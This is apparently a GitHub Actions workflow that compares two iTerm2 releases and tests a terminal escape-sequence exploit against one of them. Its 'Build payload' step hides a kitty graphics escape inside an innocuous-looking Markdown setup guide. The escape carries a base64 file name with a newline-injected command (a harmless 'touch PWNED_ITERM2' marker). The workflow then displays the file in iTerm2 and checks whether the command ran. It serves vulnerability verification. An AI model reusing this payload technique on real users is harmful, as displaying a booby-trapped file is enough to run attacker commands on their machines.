name: iterm2-verify

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'iTerm2 version'
        required: true
        default: '3.7.8'
      mode:
        description: 'Drive mode'
        required: true
        default: 'osascript'
        type: choice
        options:
          - osascript
          - direct

jobs:

  # ============================================================
  # Job A: 二进制符号对比（ubuntu，秒级完成）
  # 不需要 macOS —— strings 只是字节扫描
  # ============================================================
  symbols:
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - name: System
        run: |
          uname -a
          python3 --version

      - name: Download both versions
        run: |
          set -eux
          for V in 3_7_8 3_7_9; do
            echo "=== downloading $V ==="
            curl -sL --max-time 300 -o "/tmp/$V.zip" \
              "https://iterm2.com/downloads/stable/iTerm2-$V.zip"
            ls -la "/tmp/$V.zip"
          done

      - name: Extract
        run: |
          set -eux
          for V in 3_7_8 3_7_9; do
            mkdir -p "/tmp/x/$V"
            unzip -q "/tmp/$V.zip" -d "/tmp/x/$V" || echo "unzip failed for $V"
            echo "=== $V contents ==="
            find "/tmp/x/$V" -maxdepth 3 -type f | head -10
          done

      - name: Compare symbols
        run: |
          echo "=============================================================="
          echo "BINARY SYMBOL COMPARISON (real, from official releases)"
          echo "=============================================================="

          for V in 3_7_8 3_7_9; do
            BIN="/tmp/x/$V/iTerm.app/Contents/MacOS/iTerm2"
            if [ ! -f "$BIN" ]; then
              echo "MISSING: $BIN"
              continue
            fi
            echo ""
            echo "--- iTerm2 $V  ($(stat -c%s "$BIN") bytes) ---"
            for SYM in \
              it_reportUnsafeControlCharacterSet \
              stringByReplacingControlCharactersWithSpace \
              sanitizedResponseMessage \
              executeAPC \
              respondToTransmit \
              filenameIsSafe \
              resourceValues \
              localizedDescription \
              screenSendReportData \
              EBADF
            do
              C=$(strings -a "$BIN" | grep -c -- "$SYM" || true)
              printf "  %-46s %s\n" "$SYM" "$C"
            done
          done

      - name: Diff the two binaries
        run: |
          B1="/tmp/x/3_7_8/iTerm.app/Contents/MacOS/iTerm2"
          B2="/tmp/x/3_7_9/iTerm.app/Contents/MacOS/iTerm2"
          if [ -f "$B1" ] && [ -f "$B2" ]; then
            echo "=== sizes ==="
            stat -c%s "$B1" "$B2"
            echo ""
            echo "=== sha256 ==="
            sha256sum "$B1" "$B2"
            echo ""
            echo "=== symbols present in 3.7.9 but not 3.7.8 ==="
            strings -a "$B1" | sort -u > /tmp/s8.txt
            strings -a "$B2" | sort -u > /tmp/s9.txt
            comm -13 /tmp/s8.txt /tmp/s9.txt | grep -iE "control|sanitiz|report|kitty" | head -30 || true
          fi

  # ============================================================
  # Job B: 真实 iTerm2 测试（macOS）
  # ============================================================
  macos-test:
    runs-on: macos-14
    timeout-minutes: 25
    needs: symbols

    steps:
      - name: Environment
        run: |
          sw_vers
          uname -m
          stat -f%Su /dev/console
          pgrep -l WindowServer || echo "no WindowServer"

      - name: Download iTerm2
        env:
          VER: ${{ inputs.version }}
        run: |
          set -eux
          V=$(echo "$VER" | tr '.' '_')
          curl -L --max-time 300 -o /tmp/i.zip \
            "https://iterm2.com/downloads/stable/iTerm2-${V}.zip"
          unzip -q /tmp/i.zip -d /tmp/i
          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" \
            /tmp/i/iTerm.app/Contents/Info.plist

      - name: Build payload
        run: |
          set -eux
          CMD='touch PWNED_ITERM2'
          FP=$(printf '/tmp/x\n%s\nz' "$CMD")
          B64=$(printf '%s' "$FP" | base64)
          ESC=$(printf '\033')
          printf '# Setup Guide\n\n## Prerequisites\n- Node.js 18+\n%s_Ga=T,f=100,t=f,i=1;%s%s\\\n## Install\nnpm install\n' \
            "$ESC" "$B64" "$ESC" > /tmp/payload.md
          wc -c /tmp/payload.md
          od -c /tmp/payload.md | head -15

      - name: Clean
        run: rm -f "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2

      - name: Launch iTerm2
        run: |
          set -x
          open -a /tmp/i/iTerm.app
          sleep 12
          pgrep -l iTerm || echo "NOT RUNNING"
          cat > /tmp/d.scpt <<'SCPT'
          tell application "iTerm2"
            activate
            delay 3
            set w to (create window with default profile)
            delay 2
            tell current session of w
              write text "cat /tmp/payload.md"
            end tell
            delay 6
          end tell
          SCPT
          osascript /tmp/d.scpt 2>&1 || echo "osascript failed"
          sleep 10

      - name: Result
        if: always()
        run: |
          echo "=============================================="
          FOUND=0
          for f in "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2; do
            if [ -f "$f" ]; then
              echo "[RESULT] VULNERABLE: $f"
              ls -la "$f"
              FOUND=1
            fi
          done
          [ "$FOUND" = "0" ] && echo "[RESULT] NOT_EXPLOITED"
          echo "=============================================="
          pwd; ls -lat "$HOME" | head -15

      - name: Screenshot
        if: always()
        run: screencapture -x /tmp/s.png 2>/dev/null || true

      - name: Upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: macos-evidence
          path: |
            /tmp/payload.md
            /tmp/s.png
          if-no-files-found: warn
